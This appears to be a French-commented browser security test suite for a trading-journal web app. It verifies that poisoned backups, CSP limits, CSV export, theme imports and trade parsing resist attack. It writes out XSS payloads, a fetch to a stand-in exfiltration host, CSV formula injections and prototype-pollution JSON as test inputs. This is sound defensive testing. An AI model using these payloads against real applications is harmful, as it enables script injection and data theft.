// Tests de sécurité : un fichier piégé (backup, fusion) ne doit jamais exécuter de code, la barrière CSP bloque
// l'envoi de données vers un site tiers, l'export CSV n'injecte pas de formules, les thèmes et réglages importés sont filtrés.
import { test, after } from 'node:test';
import assert from 'node:assert/strict';
import { openJournal, closeBrowser, goto } from './helpers.mjs';

after(closeBrowser);
const PAGES = ['dashboard', 'trades', 'calendrier', 'bilan', 'stats', 'revue', 'scaling', 'propfirm', 'risque', 'replay', 'plan', 'playbooks', 'watchlist', 'export', 'parametres', 'guide'];

// Construit un backup où chaque texte (et chaque nom de clé) se termine par des charges XSS classiques.
async function poisonedBackup(page) {
  return page.evaluate(() => {
    const PAY = `<img src=x onerror=__x(1)>'"\`);__x(2);//</textarea></script><svg onload=__x(3)>`;
    const tf = v => {
      if (typeof v === 'string') {
        if (/^[[{]/.test(v)) { try { return JSON.stringify(tf(JSON.parse(v))); } catch (e) { /* texte simple */ } }
        return v + PAY;
      }
      if (Array.isArray(v)) return v.map(tf);
      if (v && typeof v === 'object') { const o = {}; Object.entries(v).forEach(([k, x]) => { o[k] = k === 'id' && typeof x === 'number' ? x : tf(x); o[k + PAY] = 'k'; }); return o; }
      return v;
    };
    trades.forEach((t, i) => { t.tags = ['tag' + i]; t.mistakes = ['FOMO']; t.setup = 'Setup' + (i % 3); t.desc = 'note'; t.review = 'rev'; });
    const data = { version: 3, journal: JOURNAL_ID, trades: tf(trades), images: {}, tombstones: [], watchData: tf(watchData), planData: tf(planData), settings: tf(collectAllSettings()), settingsMeta: {} };
    Object.entries(settingsSnapshot()).forEach(([k, e]) => { data.settingsMeta[k] = { v: typeof e.v === 'string' ? tf(e.v) : e.v, t: Date.now() + 1e6 }; });
    data.settingsMeta.g_journals = { v: JSON.stringify([{ id: `x');__x(5);//`, name: PAY, type: 'live' }]), t: Date.now() + 1e6 };
    data.trades.forEach(t => { t.id = String(t.id) + PAY; t.__proto__x = 1; });
    return JSON.stringify(data);
  });
}

for (const mode of ['import', 'merge']) {
  test(`sécurité : un backup piégé (${mode === 'import' ? 'restauration' : 'fusion'}) n'exécute aucun code`, async () => {
    const { page, ctx, errors } = await openJournal();
    page.on('dialog', d => d.accept());
    await page.evaluate(() => { window.__hits = []; window.__x = n => window.__hits.push(n); loadDemoTrades(); });
    const json = await poisonedBackup(page);
    await page.evaluate(([j, m]) => (m === 'merge' ? mergeBackup : importData)({ files: [new File([j], 'b.json')], value: '' }), [json, mode]);
    await page.waitForSelector('#modal-confirm', { state: 'visible' });
    await page.click('#modal-confirm');
    await page.waitForTimeout(400);
    if (mode === 'import') assert.match(await page.evaluate(() => trades[0].asset), /<img src=x/);   // le texte est bien là… affiché comme du texte
    for (const p of PAGES) { await goto(page, p); await page.waitForTimeout(80); }
    await page.evaluate(() => { openTradeDetail(trades[0].id); });
    await page.waitForTimeout(200);
    assert.deepEqual(await page.evaluate(() => window.__hits), []);
    assert.deepEqual(errors, []);
    await ctx.close();
  });
}

test('sécurité : la barrière CSP bloque les envois vers un site tiers et le code dynamique', async () => {
  const { page, ctx } = await openJournal();
  const r = await page.evaluate(async () => {
    const out = {};
    try { await fetch('https://evil.example/steal?d=1'); out.fetch = 'ok'; } catch (e) { out.fetch = 'bloqué'; }
    out.img = await new Promise(res => { const i = new Image(); i.onload = () => res('ok'); i.onerror = () => res('bloqué'); i.src = 'https://evil.example/p.gif'; });
    try { eval('1'); out.eval = 'ok'; } catch (e) { out.eval = 'bloqué'; }
    try { new Function('return 1')(); out.fn = 'ok'; } catch (e) { out.fn = 'bloqué'; }
    out.csp = !!document.querySelector('meta[http-equiv="Content-Security-Policy"]');
    return out;
  });
  assert.deepEqual(r, { fetch: 'bloqué', img: 'bloqué', eval: 'bloqué', fn: 'bloqué', csp: true });
  await ctx.close();
});

test('sécurité : export CSV sans formules, thèmes, trades et réglages importés filtrés', async () => {
  const { page, ctx, errors } = await openJournal();
  const r = await page.evaluate(() => ({
    csv: [csvCell('=HYPERLINK("http://x","clic")'), csvCell('+1+1'), csvCell('@SUM(A1)'), csvCell('-12,5'), csvCell('EUR/USD'), csvCell(-3)],
    theme: safeThemeObj({ '--bg': 'url(https://evil.example/x)', '--green': '#12ab34', '--x': 'red;} body{display:none', 'color': 'red', '--font-sans': "'Inter', sans-serif" }),
    proto: (() => { const t = sanitizeTrade(JSON.parse('{"id":1,"__proto__":{"evil":1},"constructor":{"x":1}}')); return [t.evil, Object.getPrototypeOf(t) === Object.prototype, Object.prototype.hasOwnProperty.call(t, 'constructor')]; })(),
    backupKeys: ['guard', 'guard_custom', 'prog'].every(k => BACKUP_SETTINGS_KEYS.includes(JP + k) && SYNCED_SETTINGS.journal.includes(k)),
    cfg: (() => { DB.setItem(JP + 'guard', JSON.stringify({ maxConsec: '<b>', maxTrades: -4, weekPct: 5, cuts: 'x' })); return rkCfg(false); })(),
    prog: (() => { DB.setItem(JP + 'prog', JSON.stringify({ stage: 99, customRisk: 'x' })); return rkProg().stage; })()
  }));
  assert.ok(r.csv[0].startsWith("\"'="), r.csv[0]); assert.equal(r.csv[1], "'+1+1"); assert.equal(r.csv[2], "'@SUM(A1)");
  assert.equal(r.csv[3], '-12,5'); assert.equal(r.csv[4], 'EUR/USD'); assert.equal(r.csv[5], '-3');
  assert.deepEqual(r.theme, { '--green': '#12ab34', '--font-sans': "'Inter', sans-serif" });
  assert.deepEqual(r.proto, [undefined, true, false]);
  assert.equal(r.backupKeys, true);
  assert.equal(r.cfg.maxConsec, 2); assert.equal(r.cfg.maxTrades, 3); assert.equal(r.cfg.weekPct, 5); assert.ok(Array.isArray(r.cfg.cuts));
  assert.equal(r.prog, 0);
  assert.deepEqual(errors, []);
  await ctx.close();
});
